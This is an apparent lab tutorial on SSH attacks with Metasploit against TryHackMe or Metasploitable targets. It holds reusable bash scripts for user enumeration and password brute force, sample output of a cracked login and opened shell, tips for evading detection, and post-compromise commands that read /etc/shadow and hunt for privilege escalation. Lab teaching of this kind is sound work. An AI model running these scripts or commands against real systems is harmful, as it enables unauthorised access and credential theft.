# SSH Enumeration with Metasploit

## Overview

SSH (Secure Shell) is an encrypted remote administration protocol used for secure command-line access to servers and network devices. This guide covers comprehensive SSH enumeration techniques using Metasploit auxiliary modules to identify service versions, enumerate users, perform brute force attacks, and gain remote access.

## SSH Fundamentals

- **Port**: 22/TCP (default, configurable)
- **Purpose**: Secure remote administration and file transfer
- **Authentication**: Password-based or public key cryptography
- **Encryption**: Full session encryption prevents eavesdropping
- **Successor**: Replaces insecure protocols like Telnet

## Lab Environment Setup

For practical exercises, use the **TryHackMe AttackBox** or **Metasploitable 2**:

**Lab URL**: [TryHackMe AttackBox](https://tryhackme.com/access) or [Metasploitable 2](https://tryhackme.com/room/metasploitable2)

**Setup Instructions**:

1. Start the target machine
2. Note the IP address provided
3. Ensure SSH service is running on port 22

## Initial Setup and Configuration

### Starting Metasploit and Workspace

```bash
# Start database and Metasploit
sudo systemctl start postgresql
msfconsole

# Create dedicated workspace
msf6 > workspace -a ssh_enum
msf6 > workspace ssh_enum

# Set global RHOSTS variable
msf6 > setg RHOSTS 192.168.1.100
msf6 > setg RHOST 192.168.1.100
```

### Dynamic Target Configuration Script

```bash
#!/bin/bash

TARGET=$1
WORKSPACE="ssh_scan_$(date +%Y%m%d_%H%M%S)"

echo "[*] Starting SSH enumeration"
echo "[*] Target: $TARGET"
echo "[*] Workspace: $WORKSPACE"

msfconsole -q -x "
workspace -a $WORKSPACE;
setg RHOSTS $TARGET;
setg RHOST $TARGET;
echo '[+] Global RHOSTS set to $TARGET';
exit"
```

**Usage**:

```bash
chmod +x ssh_setup.sh
./ssh_setup.sh 192.168.1.100
```

## SSH Version Detection

### Finding SSH Modules

```bash
msf6 > search type:auxiliary name:ssh

# Filter for scanner modules
msf6 > search type:auxiliary name:ssh scanner
```

### SSH Version Scanning

```bash
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > show options

Module options (auxiliary/scanner/ssh/ssh_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      22               yes       The target port (TCP)
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    30               yes       Timeout for the SSH probe

msf6 auxiliary(scanner/ssh/ssh_version) > run

[*] 192.168.1.100:22 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-1
[*] 192.168.1.100:22 - Server supports encryption and compression algorithms
[*] Scanned 1 of 1 hosts (100% complete)
```

### Comprehensive Version Detection Script

```bash
#!/bin/bash

TARGET=$1

msfconsole -q -x "
workspace -a ssh_version_check;
setg RHOSTS $TARGET;
use auxiliary/scanner/ssh/ssh_version;
run;
exit"
```

## User Enumeration

### SSH User Enumeration Module

```bash
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(scanner/ssh/ssh_enumusers) > info

Name: SSH User Enumeration
Description:
  This module uses a time-based attack to enumerate users on an SSH server.

msf6 auxiliary(scanner/ssh/ssh_enumusers) > show options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name              Current Setting                      Required  Description
   ----              ---------------                      --------  -----------
   CHECK_FALSE       true                                 yes       Check for false positives (random username)
   RHOSTS                                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22                                  yes       The target port (TCP)
   THREADS           1                                   yes       The number of concurrent threads
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/common_users.txt  no        File containing usernames, one per line
   VERBOSE           false                                yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set VERBOSE true
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 192.168.1.100:22 - SSH - Checking for false positives
[*] 192.168.1.100:22 - SSH - User 'sysadmin' found
[*] 192.168.1.100:22 - SSH - User 'rudy' found
[*] 192.168.1.100:22 - SSH - User 'demo' found
[*] 192.168.1.100:22 - SSH - User 'auditor' found
[*] 192.168.1.100:22 - SSH - User 'administrator' found
[*] 192.168.1.100:22 - SSH - User 'diag' found
[*] Scanned 1 of 1 hosts (100% complete)
```

### Advanced User Enumeration Script

```bash
#!/bin/bash

TARGET=$1
USER_LIST=${2:-"/usr/share/metasploit-framework/data/wordlists/common_users.txt"}

echo "[*] Enumerating SSH users on $TARGET"
echo "[*] User list: $USER_LIST"

msfconsole -q -x "
workspace -a ssh_user_enum;
setg RHOSTS $TARGET;
use auxiliary/scanner/ssh/ssh_enumusers;
set USER_FILE $USER_LIST;
set VERBOSE true;
run;
exit"
```

## SSH Brute Force Attacks

### SSH Login Scanner

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting                      Required  Description
   ----              ---------------                      --------  -----------
   BLANK_PASSWORDS   false                                no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                    yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                no        Add all users in the current database to the list
   PASSWORD                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/common_passwords.txt  no        File containing passwords, one per line
   RHOSTS                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22                                  yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                yes       Stop guessing when a credential works for a host
   THREADS           1                                   yes       The number of concurrent threads per host
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/common_users.txt  no        File containing usernames, one per line
   VERBOSE           true                                 yes       Whether to print output for all attempts
```

### Targeted Brute Force Attack

```bash
# Target specific user (sysadmin)
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME sysadmin
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 5
msf6 auxiliary(scanner/ssh/ssh_login) > set BRUTEFORCE_SPEED 3
msf6 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.168.1.100:22 - Success: 'sysadmin:haley' 'uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) Linux ubuntu 5.0.0-37-generic #40-Ubuntu SMP Thu Nov 14 00:14:01 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened
[*] Scanned 1 of 1 hosts (100% complete)
```

### Multi-User Brute Force

```bash
# Brute force multiple users
msf6 auxiliary(scanner/ssh/ssh_login) > unset USERNAME
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_AS_PASS true
msf6 auxiliary(scanner/ssh/ssh_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

### Advanced Brute Force Script

```bash
#!/bin/bash

TARGET=$1
USER_LIST=${2:-"/usr/share/metasploit-framework/data/wordlists/common_users.txt"}
PASS_LIST=${3:-"/usr/share/metasploit-framework/data/wordlists/common_passwords.txt"}

echo "[*] Starting SSH brute force attack"
echo "[*] Target: $TARGET"
echo "[*] User list: $USER_LIST"
echo "[*] Password list: $PASS_LIST"

msfconsole -q -x "
workspace -a ssh_brute_force;
setg RHOSTS $TARGET;
use auxiliary/scanner/ssh/ssh_login;
set USER_FILE $USER_LIST;
set PASS_FILE $PASS_LIST;
set STOP_ON_SUCCESS true;
set THREADS 10;
set BRUTEFORCE_SPEED 3;
set VERBOSE false;
run;
sessions;
exit"
```

## Session Management

### Working with SSH Sessions

```bash
# List active sessions
msf6 > sessions

# Interact with session
msf6 > sessions 1
[*] Starting interaction with 1...

# Execute commands in session
whoami
sysadmin

pwd
/home/sysadmin

ls -la

# Upgrade to better shell
/bin/bash -i

# Background session
Ctrl+Z
[*] Background session 1

# Return to session
msf6 > sessions -i 1
```

### Automated Session Handler Script

```bash
#!/bin/bash

TARGET=$1
USER=$2
PASS=$3

echo "[*] Attempting SSH connection to $TARGET"

msfconsole -q -x "
workspace -a ssh_manual;
use auxiliary/scanner/ssh/ssh_login;
set RHOSTS $TARGET;
set USERNAME $USER;
set PASSWORD $PASS;
set STOP_ON_SUCCESS true;
run;

# If successful, interact with session
sessions -l;
sessions -i 1;
"
```

## Public Key Authentication

### SSH Public Key Enumeration

```bash
msf6 > use auxiliary/scanner/ssh/ssh_identify_pubkeys
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > show options

Module options (auxiliary/scanner/ssh/ssh_identify_pubkeys):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   RHOSTS                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT       22               yes       The target port (TCP)
   THREADS     1                yes       The number of concurrent threads
   USER_FILE                    no        File containing usernames, one per line

msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > run
```

## Complete SSH Enumeration Workflow

### Comprehensive Assessment Script

```bash
#!/bin/bash

TARGET=$1
OUTPUT_DIR="ssh_full_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[*] Starting comprehensive SSH enumeration"
echo "[*] Target: $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

msfconsole -q -x "
workspace -a full_ssh_scan;
setg RHOSTS $TARGET;

echo '[+] Detecting SSH version';
use auxiliary/scanner/ssh/ssh_version;
run;

echo '[+] Enumerating SSH users';
use auxiliary/scanner/ssh/ssh_enumusers;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt;
set VERBOSE true;
run;

echo '[+] Performing brute force attack';
use auxiliary/scanner/ssh/ssh_login;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt;
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt;
set STOP_ON_SUCCESS true;
set THREADS 5;
set BRUTEFORCE_SPEED 3;
run;

echo '[+] SSH enumeration complete';
sessions;
credentials;
exit" > $OUTPUT_DIR/full_report.txt

echo "[+] Comprehensive report saved to $OUTPUT_DIR/full_report.txt"
```

**Usage**:

```bash
chmod +x ssh_complete_enum.sh
./ssh_complete_enum.sh 192.168.1.100
```

## Advanced SSH Enumeration Techniques

### SSH Algorithm Detection

```bash
msf6 > use auxiliary/scanner/ssh/ssh_encrypt
msf6 auxiliary(scanner/ssh/ssh_encrypt) > run
```

### SSH Username Enumeration (Timing Attack)

```bash
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set THREADS 10
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
```

## Real-World Attack Scenario

### Corporate SSH Server Assessment

```bash
#!/bin/bash

TARGET=$1
CUSTOM_USER_LIST="corp_users.txt"
CUSTOM_PASS_LIST="corp_passwords.txt"

echo "[*] Starting corporate SSH assessment"
echo "[*] Target: $TARGET"

# Phase 1: Discovery and version detection
./ssh_setup.sh $TARGET

# Phase 2: User enumeration with custom lists
msfconsole -q -x "
workspace corp_ssh_assessment;
setg RHOSTS $TARGET;
use auxiliary/scanner/ssh/ssh_enumusers;
set USER_FILE $CUSTOM_USER_LIST;
run;" > user_enum_results.txt

# Phase 3: Targeted brute force
msfconsole -q -x "
workspace corp_ssh_assessment;
use auxiliary/scanner/ssh/ssh_login;
set USER_FILE $CUSTOM_USER_LIST;
set PASS_FILE $CUSTOM_PASS_LIST;
set THREADS 10;
set BRUTEFORCE_SPEED 2;
run;" > brute_force_results.txt

echo "[+] Assessment complete. Check user_enum_results.txt and brute_force_results.txt"
```

## Best Practices and Security Considerations

### Optimization Tips

```bash
# For stealth operations
msf6 auxiliary(scanner/ssh/ssh_login) > set BRUTEFORCE_SPEED 2
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 3

# For comprehensive testing
msf6 auxiliary(scanner/ssh/ssh_login) > set BLANK_PASSWORDS true
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_AS_PASS true

# Reduce logging and detection
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false
```

### Common SSH Security Issues

1. **Weak credentials** (admin:admin, root:password)
2. **Default credentials** for services and applications
3. **Password authentication enabled** when keys should be used
4. **Outdated SSH versions** with known vulnerabilities
5. **PermitRootLogin enabled** with password authentication

### Defensive Recommendations

- Implement public key authentication
- Disable password authentication for privileged accounts
- Use fail2ban or similar tools to block brute force attempts
- Regularly update SSH software
- Monitor authentication logs for suspicious activity
- Implement multi-factor authentication

## Post-Compromise Actions

### After Successful SSH Access

```bash
# Once in SSH session:
whoami                    # Check current user
id                        # Check user privileges
sudo -l                   # Check sudo privileges
cat /etc/passwd           # List all users
cat /etc/shadow           # Check password hashes (if accessible)
uname -a                  # System information
```

### Privilege Escalation Checks

```bash
# Common privilege escalation checks
find / -perm -4000 2>/dev/null    # SUID files
find / -perm -2000 2>/dev/null    # SGID files
find / -writable 2>/dev/null      # World-writable files
crontab -l                        # Check cron jobs
```

## Next Steps

After successful SSH enumeration and access:

1. Perform local privilege escalation
2. Search for sensitive files and credentials
3. Check for password reuse on other systems
4. Establish persistence if required
5. Move to lateral movement within the network
6. Proceed to SMTP enumeration for additional attack vectors

This SSH enumeration methodology provides a thorough approach to assessing SSH services, from initial discovery to credential compromise and remote access, enabling comprehensive penetration testing of remote administration services.
